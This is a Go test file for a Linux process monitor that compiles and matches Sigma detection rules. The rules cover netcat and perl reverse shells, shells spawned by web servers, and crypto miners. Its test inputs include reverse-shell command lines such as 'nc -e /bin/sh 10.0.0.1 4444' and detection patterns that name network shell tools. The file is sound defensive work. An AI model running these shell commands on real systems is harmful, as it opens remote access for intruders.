package monitor

import (
	"os"
	"path/filepath"
	"testing"
)

// --- compileSigmaFile / loader tests ---

func TestCompileSigmaFile_SkipsNonLinux(t *testing.T) {
	yaml := `
title: Windows Test
level: high
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains: 'evil'
  condition: selection
`
	_, ok := compileSigmaFile([]byte(yaml))
	if ok {
		t.Fatal("expected non-linux rule to be skipped")
	}
}

func TestCompileSigmaFile_SkipsLowLevel(t *testing.T) {
	yaml := `
title: Low Severity
level: low
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains: 'something'
  condition: selection
`
	_, ok := compileSigmaFile([]byte(yaml))
	if ok {
		t.Fatal("expected low-level rule to be skipped")
	}
}

func TestCompileSigmaFile_SkipsMediumLevel(t *testing.T) {
	yaml := `
title: Medium Severity
level: medium
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains: 'something'
  condition: selection
`
	_, ok := compileSigmaFile([]byte(yaml))
	if ok {
		t.Fatal("expected medium-level rule to be skipped")
	}
}

func TestCompileSigmaFile_SkipsRegexModifier(t *testing.T) {
	yaml := `
title: Regex Rule
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|re: '.*evil.*'
  condition: selection
`
	_, ok := compileSigmaFile([]byte(yaml))
	if ok {
		t.Fatal("expected rule with |re modifier to be skipped")
	}
}

func TestCompileSigmaFile_SkipsAggregationCondition(t *testing.T) {
	yaml := `
title: Count Rule
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains: 'evil'
  condition: selection | count() > 5
`
	_, ok := compileSigmaFile([]byte(yaml))
	if ok {
		t.Fatal("expected rule with aggregation condition to be skipped")
	}
}

func TestCompileSigmaFile_SkipsUnsupportedField(t *testing.T) {
	yaml := `
title: Unknown Field
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    User|contains: 'root'
  condition: selection
`
	_, ok := compileSigmaFile([]byte(yaml))
	if ok {
		t.Fatal("expected rule with unsupported field to be skipped")
	}
}

func TestCompileSigmaFile_ValidHighRule(t *testing.T) {
	yaml := `
title: Test High Rule
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/nc'
    CommandLine|contains: '-e'
  condition: selection
`
	p, ok := compileSigmaFile([]byte(yaml))
	if !ok {
		t.Fatal("expected valid high rule to compile successfully")
	}
	if p.Title != "Test High Rule" {
		t.Errorf("expected title %q, got %q", "Test High Rule", p.Title)
	}
	if p.Level != "high" {
		t.Errorf("expected level %q, got %q", "high", p.Level)
	}
	if len(p.Required) != 1 {
		t.Errorf("expected 1 required selection, got %d", len(p.Required))
	}
}

func TestCompileSigmaFile_ValidCriticalRule(t *testing.T) {
	yaml := `
title: Critical Rule
level: critical
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains: 'dangerous'
  condition: selection
`
	p, ok := compileSigmaFile([]byte(yaml))
	if !ok {
		t.Fatal("expected valid critical rule to compile successfully")
	}
	if p.Level != "critical" {
		t.Errorf("expected level %q, got %q", "critical", p.Level)
	}
}

// --- matchSigmaPattern tests ---

func TestMatchSigmaPattern_Contains(t *testing.T) {
	p := sigmaPattern{
		Title:       "Test Contains",
		Level:       "high",
		ConditionOp: "and",
		Required: []sigmaSelection{
			{
				{
					{Field: "CommandLine", Modifier: "contains", Values: []string{"--evil-flag"}},
				},
			},
		},
	}
	if !matchSigmaPattern("", "--evil-flag arg", "", p) {
		t.Error("expected match for commandline containing '--evil-flag'")
	}
	if matchSigmaPattern("", "innocent command", "", p) {
		t.Error("expected no match for innocent command")
	}
}

func TestMatchSigmaPattern_ContainsOrList(t *testing.T) {
	p := sigmaPattern{
		Title:       "Test Contains OR",
		Level:       "high",
		ConditionOp: "and",
		Required: []sigmaSelection{
			{
				{
					{Field: "CommandLine", Modifier: "contains", Values: []string{"--stratum", "stratum+tcp://"}},
				},
			},
		},
	}
	if !matchSigmaPattern("", "xmrig stratum+tcp://pool.example.com", "", p) {
		t.Error("expected match for stratum URL")
	}
	if !matchSigmaPattern("", "miner --stratum other args", "", p) {
		t.Error("expected match for --stratum flag")
	}
	if matchSigmaPattern("", "innocent process", "", p) {
		t.Error("expected no match")
	}
}

func TestMatchSigmaPattern_EndsWith(t *testing.T) {
	p := sigmaPattern{
		Title:       "Test EndsWith",
		Level:       "high",
		ConditionOp: "and",
		Required: []sigmaSelection{
			{
				{
					{Field: "Image", Modifier: "endswith", Values: []string{"/nc", "/ncat"}},
				},
			},
		},
	}
	if !matchSigmaPattern("/usr/bin/nc", "nc -e /bin/sh", "", p) {
		t.Error("expected match for /usr/bin/nc image")
	}
	if !matchSigmaPattern("/usr/bin/ncat", "ncat -e /bin/sh", "", p) {
		t.Error("expected match for /usr/bin/ncat image")
	}
	if matchSigmaPattern("/usr/bin/cat", "cat file", "", p) {
		t.Error("expected no match for /usr/bin/cat")
	}
}

func TestMatchSigmaPattern_StartsWith(t *testing.T) {
	p := sigmaPattern{
		Title:       "Test StartsWith",
		Level:       "high",
		ConditionOp: "and",
		Required: []sigmaSelection{
			{
				{
					{Field: "CommandLine", Modifier: "startswith", Values: []string{"python -c"}},
				},
			},
		},
	}
	if !matchSigmaPattern("", "python -c 'import socket'", "", p) {
		t.Error("expected match")
	}
	if matchSigmaPattern("", "echo python -c", "", p) {
		t.Error("expected no match when not at start")
	}
}

func TestMatchSigmaPattern_ContainsAll(t *testing.T) {
	p := sigmaPattern{
		Title:       "Test ContainsAll",
		Level:       "high",
		ConditionOp: "and",
		Required: []sigmaSelection{
			{
				{
					{Field: "CommandLine", Modifier: "contains_all", Values: []string{"import", "socket", "connect"}},
				},
			},
		},
	}
	if !matchSigmaPattern("", "python -c 'import socket; socket.connect'", "", p) {
		t.Error("expected match when all keywords present")
	}
	if matchSigmaPattern("", "python -c 'import socket'", "", p) {
		t.Error("expected no match when not all keywords present")
	}
}

func TestMatchSigmaPattern_AllOfSelection(t *testing.T) {
	// "all of selection_*" — both selection_img and selection_flags must match
	sel1 := sigmaSelection{{
		{Field: "Image", Modifier: "endswith", Values: []string{"/nc"}},
	}}
	sel2 := sigmaSelection{{
		{Field: "CommandLine", Modifier: "contains", Values: []string{"-e"}},
	}}
	p := sigmaPattern{
		Title:       "All Of Test",
		Level:       "high",
		ConditionOp: "and",
		Required:    []sigmaSelection{sel1, sel2},
	}
	if !matchSigmaPattern("/usr/bin/nc", "nc -e /bin/sh", "", p) {
		t.Error("expected match when both selections satisfied")
	}
	if matchSigmaPattern("/usr/bin/nc", "nc innocent", "", p) {
		t.Error("expected no match when only one selection matches")
	}
	if matchSigmaPattern("/usr/bin/cat", "cat -e file", "", p) {
		t.Error("expected no match when only image selection fails")
	}
}

func TestMatchSigmaPattern_OneOfSelection(t *testing.T) {
	// "1 of selection_*" — any of the selections must match
	sel1 := sigmaSelection{{
		{Field: "CommandLine", Modifier: "contains", Values: []string{"stratum+tcp://"}},
	}}
	sel2 := sigmaSelection{{
		{Field: "CommandLine", Modifier: "contains", Values: []string{"--donate-level=0"}},
	}}
	p := sigmaPattern{
		Title:       "One Of Test",
		Level:       "high",
		ConditionOp: "or",
		Required:    []sigmaSelection{sel1, sel2},
	}
	if !matchSigmaPattern("", "miner stratum+tcp://pool:3333", "", p) {
		t.Error("expected match via first selection")
	}
	if !matchSigmaPattern("", "xmrig --donate-level=0", "", p) {
		t.Error("expected match via second selection")
	}
	if matchSigmaPattern("", "innocent command", "", p) {
		t.Error("expected no match")
	}
}

func TestMatchSigmaPattern_Filter(t *testing.T) {
	// "selection and not filter" — selection matches but filter excludes
	required := sigmaSelection{{
		{Field: "CommandLine", Modifier: "contains", Values: []string{"-e"}},
	}}
	forbidden := sigmaSelection{{
		{Field: "CommandLine", Modifier: "contains", Values: []string{"legitimate-flag -e"}},
	}}
	p := sigmaPattern{
		Title:       "Filter Test",
		Level:       "high",
		ConditionOp: "and",
		Required:    []sigmaSelection{required},
		Forbidden:   []sigmaSelection{forbidden},
	}
	if !matchSigmaPattern("", "nc -e /bin/sh", "", p) {
		t.Error("expected match when filter does not apply")
	}
	if matchSigmaPattern("", "tool legitimate-flag -e", "", p) {
		t.Error("expected no match when forbidden filter applies")
	}
}

func TestMatchSigmaPattern_ListSelection(t *testing.T) {
	// A selection that is a list of alternatives (OR between groups)
	// Matches if EITHER group matches
	sel := sigmaSelection{
		// Alternative 1: must have both 'fdopen' and 'Socket'
		{
			{Field: "CommandLine", Modifier: "contains_all", Values: []string{"fdopen(", "Socket"}},
		},
		// Alternative 2: must have 'connect' and 'exec'
		{
			{Field: "CommandLine", Modifier: "contains_all", Values: []string{"connect", "exec"}},
		},
	}
	p := sigmaPattern{
		Title:       "List Selection Test",
		Level:       "high",
		ConditionOp: "and",
		Required:    []sigmaSelection{sel},
	}
	if !matchSigmaPattern("", "perl -e 'use Socket; fdopen(S, ...)'", "", p) {
		t.Error("expected match via first alternative")
	}
	if !matchSigmaPattern("", "perl -e 'connect(S,...); exec /bin/sh'", "", p) {
		t.Error("expected match via second alternative")
	}
	if matchSigmaPattern("", "perl innocent", "", p) {
		t.Error("expected no match")
	}
}

func TestMatchSigmaPattern_ParentImage(t *testing.T) {
	p := sigmaPattern{
		Title:       "Parent Image Test",
		Level:       "high",
		ConditionOp: "and",
		Required: []sigmaSelection{
			{
				{
					{Field: "ParentImage", Modifier: "endswith", Values: []string{"/apache2", "/nginx"}},
				},
			},
		},
	}
	if !matchSigmaPattern("", "sh -i", "/usr/sbin/apache2", p) {
		t.Error("expected match when parent is apache2")
	}
	if matchSigmaPattern("", "sh -i", "/usr/bin/bash", p) {
		t.Error("expected no match when parent is bash")
	}
}

// --- loadSigmaPatterns tests ---

func TestLoadSigmaPatterns_DirAbsent(t *testing.T) {
	patterns := loadSigmaPatterns("/nonexistent/path/sigma")
	if patterns != nil {
		t.Errorf("expected nil for absent directory, got %d patterns", len(patterns))
	}
}

func TestLoadSigmaPatterns_ValidRules(t *testing.T) {
	dir := t.TempDir()
	rulesDir := filepath.Join(dir, "rules", "linux", "process_creation")
	if err := os.MkdirAll(rulesDir, 0o755); err != nil {
		t.Fatal(err)
	}

	rule := `
title: Netcat Reverse Shell
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith: '/nc'
    CommandLine|contains: '-e'
  condition: selection
`
	if err := os.WriteFile(filepath.Join(rulesDir, "test_nc.yml"), []byte(rule), 0o644); err != nil {
		t.Fatal(err)
	}
	// A low-level rule that should be skipped.
	lowRule := `
title: Low Rule
level: low
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains: 'something'
  condition: selection
`
	if err := os.WriteFile(filepath.Join(rulesDir, "test_low.yml"), []byte(lowRule), 0o644); err != nil {
		t.Fatal(err)
	}

	patterns := loadSigmaPatterns(dir)
	if len(patterns) != 1 {
		t.Errorf("expected 1 pattern (low rule skipped), got %d", len(patterns))
	}
	if patterns[0].Title != "Netcat Reverse Shell" {
		t.Errorf("unexpected pattern title: %q", patterns[0].Title)
	}
}

func TestLoadSigmaPatterns_AllOfSelectionRule(t *testing.T) {
	dir := t.TempDir()
	rulesDir := filepath.Join(dir, "rules", "linux", "process_creation")
	if err := os.MkdirAll(rulesDir, 0o755); err != nil {
		t.Fatal(err)
	}

	rule := `
title: Netcat With Shell
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection_img:
    Image|endswith:
      - '/nc'
      - '/ncat'
  selection_flags:
    CommandLine|contains:
      - ' -c '
      - ' -e '
  condition: all of selection_*
`
	if err := os.WriteFile(filepath.Join(rulesDir, "test_allof.yml"), []byte(rule), 0o644); err != nil {
		t.Fatal(err)
	}

	patterns := loadSigmaPatterns(dir)
	if len(patterns) != 1 {
		t.Fatalf("expected 1 pattern, got %d", len(patterns))
	}
	p := patterns[0]

	// Both selections must be in Required with AND op.
	if p.ConditionOp != "and" {
		t.Errorf("expected ConditionOp 'and', got %q", p.ConditionOp)
	}
	if len(p.Required) != 2 {
		t.Errorf("expected 2 required selections, got %d", len(p.Required))
	}

	// Should match: image ends with /nc AND cmdline contains -e
	if !matchSigmaPattern("/usr/bin/nc", "nc -e /bin/sh 10.0.0.1 4444", "", p) {
		t.Error("expected match for nc -e")
	}
	// Should not match: image is nc but no -c or -e flag
	if matchSigmaPattern("/usr/bin/nc", "nc -l 4444", "", p) {
		t.Error("expected no match for nc listening (no -e/-c)")
	}
}

func TestLoadSigmaPatterns_CryptoMiningRule(t *testing.T) {
	dir := t.TempDir()
	rulesDir := filepath.Join(dir, "rules", "linux", "process_creation")
	if err := os.MkdirAll(rulesDir, 0o755); err != nil {
		t.Fatal(err)
	}

	rule := `
title: Crypto Mining
level: high
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'stratum+tcp://'
      - '--donate-level=0'
  condition: selection
`
	if err := os.WriteFile(filepath.Join(rulesDir, "test_mining.yml"), []byte(rule), 0o644); err != nil {
		t.Fatal(err)
	}

	patterns := loadSigmaPatterns(dir)
	if len(patterns) != 1 {
		t.Fatalf("expected 1 pattern, got %d", len(patterns))
	}
	if !matchSigmaPattern("/usr/bin/xmrig", "xmrig stratum+tcp://pool.example:3333", "", patterns[0]) {
		t.Error("expected match for stratum URL")
	}
	if !matchSigmaPattern("/usr/bin/xmrig", "xmrig --donate-level=0 -o pool:3333", "", patterns[0]) {
		t.Error("expected match for donate-level flag")
	}
}
